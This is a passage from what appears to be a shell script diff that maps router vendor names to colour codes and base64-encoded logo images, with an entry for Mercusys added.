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'
 										["Linksys"]='#0065B4 #70A0D4 #BFBFBF data:image/svg+xml;base64,PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iVVRGLTgiPz4KPCEtLSBHZW5lcmF0b3I6IEFkb2JlIElsbHVzdHJhdG9yIDE5LjAuMCwgU1ZHIEV4cG9ydCBQbHVnLUluIC4gU1ZHIFZlcnNpb246IDYuMDAgQnVpbGQgMCkgIC0tPgo8c3ZnIGVuYWJsZS1iYWNrZ3JvdW5kPSJuZXcgLTI0OCAzODkgMTE0IDE2IiB2ZXJzaW9uPSIxLjEiIHZpZXdCb3g9Ii0yNDggMzg5IDExNCAxNiIgeG1sOnNwYWNlPSJwcmVzZXJ2ZSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4KPHN0eWxlIHR5cGU9InRleHQvY3NzIj4KCS5zdDB7ZmlsbDojMDAwO30KPC9zdHlsZT4KPHBvbHlnb24gY2xhc3M9InN0MCIgcG9pbnRzPSItMTY0LjYgNDA1IC0xNjAuNiA0MDUgLTE2MC42IDM5OS44IC0xNTMuNCAzODkgLTE1Ny44IDM4OSAtMTYyLjQgMzk2LjMgLTE2NyAzODkgLTE3MS43IDM4OSAtMTY0LjYgMzk5LjkiLz4KPHBvbHlnb24gY2xhc3M9InN0MCIgcG9pbnRzPSItMjAzLjUgMzk3IC0xOTQuOCAzODkgLTE4OS40IDM4OSAtMTk4LjEgMzk3IC0xODkuNCA0MDUgLTE5NC44IDQwNSIvPgo8cmVjdCBjbGFzcz0ic3QwIiB4PSItMjI5LjYiIHk9IjM4OSIgd2lkdGg9IjQuMSIgaGVpZ2h0PSIxNiIvPgoKCTxwYXRoIGNsYXNzPSJzdDAiIGQ9Im0tMTg4LjUgNDA1aDEyLjhjMi4yIDAgMy43LTEuMiAzLjctMy44di0yLjJjMC0yLjMtMS4yLTMuOC0zLjctMy44aC05LjZ2LTNoMTIuNHYtMy4yaC0xMi42Yy0yLjMgMC0zLjcgMS4zLTMuNyAzLjh2MmMwIDIuMiAxLjMgMy43IDMuNyAzLjdoOS42djMuM2gtMTIuNnYzLjIiLz4KCTxwYXRoIGNsYXNzPSJzdDAiIGQ9Im0tMTUzLjEgNDA1aDEzLjVjMi4yIDAgMy43LTEuMiAzLjctMy44di0yLjJjMC0yLjMtMS4yLTMuOC0zLjctMy44aC05LjZ2LTNoMTIuNHYtMy4yaC0xMi43Yy0yLjMgMC0zLjcgMS4zLTMuNyAzLjh2MmMwIDIuMiAxLjMgMy43IDMuNyAzLjdoOS42djMuM2gtMTMuMnYzLjIiLz4KCTxwb2x5Z29uIGNsYXNzPSJzdDAiIHBvaW50cz0iLTI0OCA0MDUgLTIzMi4xIDQwNSAtMjMyLjEgNDAxLjggLTI0My45IDQwMS44IC0yNDMuOSAzODkgLTI0OCAzODkiLz4KCTxwb2x5Z29uIGNsYXNzPSJzdDAiIHBvaW50cz0iLTIyMi40IDQwNSAtMjE4LjcgNDA1IC0yMTguNyAzOTMuNiAtMjA2LjYgNDA1IC0yMDQuMSA0MDUgLTIwNC4xIDM4OSAtMjA3LjggMzg5IC0yMDcuOCAzOTguNiAtMjE3LjkgMzg5IC0yMjIuNCAzODkiLz4KCTxwYXRoIGNsYXNzPSJzdDAiIGQ9Im0tMTM1IDM4OS4yaC0wLjR2MWgtMC4ydi0xaC0wLjR2LTAuMmgwLjl2MC4yaDAuMXptMS40LTAuMmgtMC4ybC0wLjQgMC45LTAuNS0wLjloLTAuMnYxLjJoMC4ydi0wLjlsMC40IDAuOGgwLjFsMC40LTAuOHYwLjhoMC4ydi0xLjF6Ii8+Cgo8L3N2Zz4K'
+										["Mercusys"]='#DF6562 #AB4746 #BFBFBF data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAO0AAAAZCAMAAADqkFmyAAAARVBMVEVHcEz///////////////////////////////////////////////////////////////////////////////////////9X1DS3AAAAFnRSTlMA/nfh+PMK0/zrryxSvxuUQGCFyqNtwmvZmgAAA+NJREFUWMO9mInSnCAMgOUWDzx33/9RCyiQAK57dP7MtLWLgXwkJMGm+RsZ1n1TjGnGmBr3xbylZNaRCd464VyzraNv6UkK1IRT68MQcdKKFSswcoiwzxu5Eh70yxE1A1LVPq34Af+3fR6bRtunCS66BO3N2zx6rUzavnVvLBiPB03WyI77xc73w7/nm2GaDarPcXJH/rwUoF9ImHAWtVFL66zq4Ko0DDL7n5VcLLl5uyTyTRgk/UIuLYW0T7hd+ndaQjqM4H/kwgon97T0eknncsKA3hoH6fDCUkQrKq7FtFplMkL98zcWN5e4/QfL8ymdur6/oU1RzIU77FprexSJM/uYkqa5SAqYFEdtroZpgb6u09JaSsh3rzFxcZcLOIxdLK9oTdgxIbMMZP+MfiRunQD+iltkSjVMy0vXfkOb3rcn9xGHdfMJ7ZCyUmVNDiccYyyZZA0Z6ukaxPZUuPY3WgXP/PIRLdhwNheax+h+JPwIuCAaPdzQtg3W/w+08fiR5iNaCTOMKHaq8787t8u4gp8KZmS+1qzlsTZ1uWt/pi2PyXu0yAiX4DJdEfJqWIwcga1gAXi2uyxpJ5RFFz9RjXYfgjyoF3NHK2sZ/y3aPqubpEOG92fii8XnLMCSZ2qbyWlT4hyPbSOCvVVvaZVWJ9r+RZK66S76vCkhI+Td/U+pKofDLXVupDIZ7QM417t2+IE2JZjuF1p7OPO2iHR5LBcJ1spUdFObRLRJVflH3XxBKw4BodT/RttIVXTJKV8ZCKVQbR2LbVoRbfLHeoQFuzi3PRL5qk9+ok6Lf0FrkbZ80qQwPS8nL3kVpEX+c+mNfZ6Tq3Y9y2P9CW1pOHmU+YFUOpAdX6DIDml7ODR/RcsPgekdNo5l8RN5CK7VwMwMZ6VzWbVtWlF6FpC22fB87Ot6K1DIqRehrFNDk/WAeUtN+bNSym5obS0VRed02iEJSC6YVn1ES5Fz55pTYEM05u2vk0fpKPIFreVt67RnMxbCCNJ21Qv/ZS/VorcZuNuC3ZL2tBjcz6Zbv+syVzV2Ex36wu+vI3lRG1Jb65GcrDQ5rblMRG2NNhphyuaGa+1vnMQv2oErPie4eHbowwCJX1zOu8AVLcVqJP+SEmknmCEg7dG33H67iCsSZISsl+s8WeTJfL1YEXSgNdr5yi8yoz0zuilpUZa4p52ybm5g5IK2eZQTi6G4iMG6KV/TXhREFrpHSuNFkE7TdDYr89H209C7mPMegOXh9dNz9nIqg0PHbKymbzhch0I7bCLdCjnbg1mSaaBwjk7oZmDC0vACrEo1vb/3PffvRF6PHPL5jDW1f+Bx7uGP7kSnAAAAAElFTkSuQmCC'
 										["Mitrastar"]='#70A0D4 #E3E6E5 #B2B2B2 data:image/png;base64,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'
 										["Motorola"]='#0033FF #000106 #CCCCCC data:image/svg+xml;base64,PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iVVRGLTgiIHN0YW5kYWxvbmU9Im5vIj8+CjwhLS0gR2VuZXJhdG9yOiBBZG9iZSBJbGx1c3RyYXRvciAxNC4wLjAsIFNWRyBFeHBvcnQgUGx1Zy1JbiAuIFNWRyBWZXJzaW9uOiA2LjAwIEJ1aWxkIDQzMzYzKSAgLS0+Cgo8c3ZnCiAgIHhtbG5zOmRjPSJodHRwOi8vcHVybC5vcmcvZGMvZWxlbWVudHMvMS4xLyIKICAgeG1sbnM6Y2M9Imh0dHA6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL25zIyIKICAgeG1sbnM6cmRmPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5LzAyLzIyLXJkZi1zeW50YXgtbnMjIgogICB4bWxuczpzdmc9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIgogICB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciCiAgIHhtbG5zOnNvZGlwb2RpPSJodHRwOi8vc29kaXBvZGkuc291cmNlZm9yZ2UubmV0L0RURC9zb2RpcG9kaS0wLmR0ZCIKICAgeG1sbnM6aW5rc2NhcGU9Imh0dHA6Ly93d3cuaW5rc2NhcGUub3JnL25hbWVzcGFjZXMvaW5rc2NhcGUiCiAgIHZlcnNpb249IjEuMSIKICAgaWQ9IkxheWVyXzEiCiAgIHg9IjBweCIKICAgeT0iMHB4IgogICB3aWR0aD0iNDQuOTU0OTk4IgogICBoZWlnaHQ9IjQ0Ljk1NDk5OCIKICAgdmlld0JveD0iMCAwIDQ0Ljk1NDk5OCA0NC45NTQ5OTgiCiAgIHhtbDpzcGFjZ